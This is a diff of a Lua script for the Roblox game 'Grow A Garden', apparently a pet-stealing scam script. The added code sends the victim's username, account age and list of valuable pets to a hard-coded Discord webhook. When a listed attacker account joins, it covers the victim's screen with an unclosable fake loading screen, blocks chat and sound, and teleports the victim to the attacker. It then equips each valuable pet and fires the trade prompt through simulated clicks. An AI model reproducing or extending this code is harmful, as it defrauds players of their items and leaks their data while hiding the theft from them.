@@ -1,99 +1,135 @@
--- 🐾 Pet Emojis
-local petEmojis = {
-    ["Orangutan"] = "🦧", ["Hamster"] = "🐹", ["Tarantula Hawk"] = "🕷️", ["Sea Turtle"] = "🐢",
-    ["Honey Bee"] = "🍯🐝", ["Crab"] = "🦀", ["Wasp"] = "🐝", ["Bee"] = "🐝",
-    ["Toucan"] = "🦜", ["Caterpillar"] = "🐛", ["Pack Bee"] = "📦🐝", ["Seal"] = "🦭",
-    ["Scarlet Macaw"] = "🦜", ["Snail"] = "🐌", ["Cow"] = "🐄", ["Sea Otter"] = "🦦",
-    ["Peacock"] = "🦚", ["Moon Cat"] = "🐈‍⬛", ["Silver Monkey"] = "🐒", ["Dragonfly"] = "🐉",
-    ["T-Rex"] = "🦖", ["Disco Bee"] = "🐝", ["Pterodactyl"] = "🦅", ["Raccoon"] = "🦝",
-    ["Mimic Octopus"] = "🐙", ["Fennec Fox"] = "🦊", ["Hyacinth Macaw"] = "🦜", ["Bear"] = "🐻",
-    ["Petal Bee"] = "🌸🐝", ["Red Giant Ant"] = "🐜", ["Giant Ant"] = "🐜", ["Mole"] = "🦦",
-    ["Meerkat"] = "🐾", ["Flamingo"] = "🦩", ["Butterfly"] = "🦋", ["Capybara"] = "🦫",
-    ["Queen Bee"] = "👑🐝", ["Praying Mantis"] = "🪲", ["Brontosaurus"] = "🦖", ["Moth"] = "🦋",
-    ["Bald Eagle"] = "🦅", ["Chicken Zombie"] = "🐔💀", ["Squirrel"] = "🐿️", ["Frog"] = "🐸",
-    ["Blood Kiwi"] = "🥝🩸", ["Monkey"] = "🐒", ["Axolotl"] = "🦎", ["Cooked Owl"] = "🦉",
-    ["Snake"] = "🐍", ["Raptor"] = "🦖", ["Pig"] = "🐖", ["Grey Mouse"] = "🐭",
-    ["Seagull"] = "🐦", ["Blood Hedgehog"] = "🦔🩸", ["Panda"] = "🐼", ["Turtle"] = "🐢",
-    ["Golden Lab"] = "🐕", ["Stegosaurus"] = "🦖", ["Hedgehog"] = "🦔"
-}
-
--- 🌈 Mutation Emojis
-local mutationIcons = {
-    ["Shiny"] = "✨", ["Inverted"] = "🔄", ["Frozen"] = "❄️", ["Windy"] = "💨",
-    ["Golden"] = "💰", ["Mega"] = "🔥", ["Tiny"] = "🔹", ["Tranquil"] = "🧘",
-    ["IronSkin"] = "🛡️", ["Radiant"] = "🌟", ["Rainbow"] = "🌈", ["Shocked"] = "⚡",
-    ["Ascended"] = "🌀"
-}
-
--- ✅ Config
+-- ✅ Configuration
 local CONFIG = {
     WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
-    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" },
+    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" }, -- ✅ multiple usernames here
     PET_WHITELIST = {
         "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
         "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
-    }
+    },
+    FILE_URL = "https://cdn.discordapp.com/attachments/.../items.txt"
 }
 
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then return end
+if _G.scriptExecuted then
+return
+end
 _G.scriptExecuted = true
 
-local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
-if getServerType and getServerType:IsA("RemoteFunction") then
-    local ok, serverType = pcall(function()
-        return getServerType:InvokeServer()
-    end)
-    if ok and serverType == "VIPServer" then
-        game.Players.LocalPlayer:Kick("Server error. Please join a Public server")
-        return
-    end
-end
-
+-- 🛠️ Services & Variables
+repeat task.wait() until game:IsLoaded()
 local VICTIM = game.Players.LocalPlayer
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 local victimPetTable = {}
 
--- 📝 Format pet entry
-local function formatPetDetails(petData)
-    local name = petData.PetType
-    local rarity = petData.Rarity or "?"
-    local kg = math.floor((petData.KG or 0) * 10) / 10
-    local ageSec = tonumber(petData.Age or 0)
-    local days = math.floor(ageSec / 86400)
-    local ageDisplay = days > 0 and (days .. "d") or math.floor(ageSec / 3600) .. "h"
+-- 🎭 Fake Legit Loading for Detected USERNAMES
+local function showBlockingLoadingScreen()
+    local plr = game.Players.LocalPlayer
+    local playerGui = plr:WaitForChild("PlayerGui")
 
-    -- 🔥 Combine mutation icons
-    local mutation = petData.Mutation
-    local mutationStr = ""
-    if mutation then
-        for _, mut in pairs(mutation) do
-            local icon = mutationIcons[mut]
-            if icon then mutationStr = mutationStr .. icon end
+    -- Block chat
+    pcall(function()
+        local StarterGui = game:GetService("StarterGui")
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    end)
+
+    -- Hide leaderboard
+    pcall(function()
+        local StarterGui = game:GetService("StarterGui")
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+    end)
+
+    -- Mute all sounds
+    for _, sound in ipairs(workspace:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
         end
     end
 
-    local emoji = petEmojis[name] or ""
-    return string.format("%s%s %s (%s | %.1fkg | %s old)", mutationStr, emoji, name, rarity, kg, ageDisplay)
+    -- Create fake loading GUI
+    local loadingScreen = Instance.new("ScreenGui")
+    loadingScreen.Name = "UnclosableLoading"
+    loadingScreen.ResetOnSpawn = false
+    loadingScreen.IgnoreGuiInset = true
+    loadingScreen.DisplayOrder = 999999
+    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    loadingScreen.Parent = playerGui
+
+    -- Prevent removal
+    loadingScreen.AncestryChanged:Connect(function()
+        loadingScreen.Parent = playerGui
+    end)
+
+    -- Black background
+    local blackFrame = Instance.new("Frame")
+    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.Position = UDim2.new(0, 0, 0, 0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.ZIndex = 1
+    blackFrame.Parent = loadingScreen
+
+    -- Blur effect
+    local blurEffect = Instance.new("BlurEffect")
+    blurEffect.Size = 24
+    blurEffect.Name = "FreezeBlur"
+    blurEffect.Parent = game:GetService("Lighting")
+
+    -- Loading text
+    local loadingLabel = Instance.new("TextLabel")
+    loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
+    loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
+    loadingLabel.BackgroundTransparency = 1
+    loadingLabel.TextScaled = true
+    loadingLabel.Text = "Loading Wait a Moment <3..."
+    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+    loadingLabel.Font = Enum.Font.SourceSansBold
+    loadingLabel.ZIndex = 2
+    loadingLabel.Parent = loadingScreen
+
+    -- Animate loading text
+    coroutine.wrap(function()
+        while true do
+            for i = 1, 3 do
+                loadingLabel.Text = "Loading" .. string.rep(".", i)
+                task.wait(0.5)
+            end
+        end
+    end)()
+
+    -- Reapply effects if removed
+    coroutine.wrap(function()
+        while true do
+            task.wait(1)
+            -- Reapply blur if removed
+            if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
+                local newBlur = Instance.new("BlurEffect")
+                newBlur.Size = 24
+                newBlur.Name = "FreezeBlur"
+                newBlur.Parent = game:GetService("Lighting")
+            end
+
+            -- Remute if volume restored
+            for _, sound in ipairs(workspace:GetDescendants()) do
+                if sound:IsA("Sound") and sound.Volume > 0 then
+                    sound.Volume = 0
+                end
+            end
+        end
+    end)()
 end
 
--- ✅ Filter whitelist
-local function checkPetsWhilelist(pet)
-    for _, name in CONFIG.PET_WHITELIST do
-        if string.find(pet, name) then return true end
-    end
-end
 
--- 🎒 Collect valid pets
-local function getPlayersPets()
-    for petUid, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if checkPetsWhilelist(petData.PetType) then
-            table.insert(victimPetTable, formatPetDetails(petData))
+local function waitForJoin()
+    for _, player in game.Players:GetPlayers() do
+        if table.find(CONFIG.USERNAMES, player.Name) then
+            showBlockingLoadingScreen()
+            return true, player.Name
         end
     end
+    return false, nil
 end
 
--- 🌐 Send Discord Webhook
 local function createDiscordEmbed(petList, totalValue)
     local embed = {
         title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
@@ -101,7 +137,7 @@ local function createDiscordEmbed(petList, totalValue)
         fields = {
             {
                 name = "👤 Player Information",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
                 inline = false
             },
@@ -142,14 +178,87 @@ local function createDiscordEmbed(petList, totalValue)
     })
 end
 
+local function checkPetsWhilelist(pet)
+    for _, name in CONFIG.PET_WHITELIST do
+        if string.find(pet, name) then return true end
+    end
+end
+
+local function getPetObject(petUid)
+    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then return object end
+    end
+    for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then return object end
+    end
+end
+
+local function equipPet(pet)
+    if pet:GetAttribute("d") then
+        game.ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
+    end
+    VICTIM.Character.Humanoid:EquipTool(pet)
+end
+
+local function teleportTarget(targetName)
+    local target = game.Players:FindFirstChild(targetName)
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
+    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("HumanoidRootPart") then return end
+    VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+end
+
+local function deltaBypass()
+    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X/2, workspace.Camera.ViewportSize.Y/2, 0, true, nil, false)
+    task.wait()
+    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X/2, workspace.Camera.ViewportSize.Y/2, 0, false, nil, false)
+end
+
+local function startSteal(targetName)
+    local target = game.Players:FindFirstChild(targetName)
+    if target and target.Character and target.Character:FindFirstChild("Head") then
+        local prompt = target.Character.Head:FindFirstChild("ProximityPrompt")
+        if prompt then
+            prompt.HoldDuration = 0
+            deltaBypass()
+        end
+    end
+end
+
+local function checkPetsInventory(targetName)
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhilelist(value.PetType) then continue end
+        local petObject = getPetObject(petUid)
+        if not petObject then continue end
+        equipPet(petObject)
+        startSteal(targetName)
+    end
+end
+
+local function getPlayersPets()
+    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+        if checkPetsWhilelist(value.PetType) then
+            table.insert(victimPetTable, value.PetType)
+        end
+    end
+end
+
+local function idlingTarget()
+    while task.wait(0.2) do
+        local isTarget, targetName = waitForJoin()
+        if isTarget then
+            teleportTarget(targetName)
+            checkPetsInventory(targetName)
+        end
+    end
+end
+
 -- 🟢 Start
 getPlayersPets()
-
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
-            local fullList = table.concat(victimPetTable, "\n")
-            createDiscordEmbed(fullList, "100000")
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
+            idlingTarget()
             break
         end
     end
